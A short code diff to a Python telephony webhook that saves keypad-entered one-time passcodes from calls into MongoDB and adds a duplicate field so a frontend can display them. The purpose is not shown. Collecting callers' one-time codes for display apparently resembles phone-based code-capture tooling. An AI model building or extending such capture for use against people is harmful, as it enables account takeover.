@@ -337,6 +337,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             
             await MongoDBService.update_call_events(call_id, event)
             await MongoDBService.update_call_field(call_id, 'otp_code', Digits)
+            await MongoDBService.update_call_field(call_id, 'otp_entered', Digits)  # For frontend consistency
             await MongoDBService.update_call_field(call_id, 'dtmf_code', Digits)
             await MongoDBService.update_call_status(call_id, 'otp_entered')
             
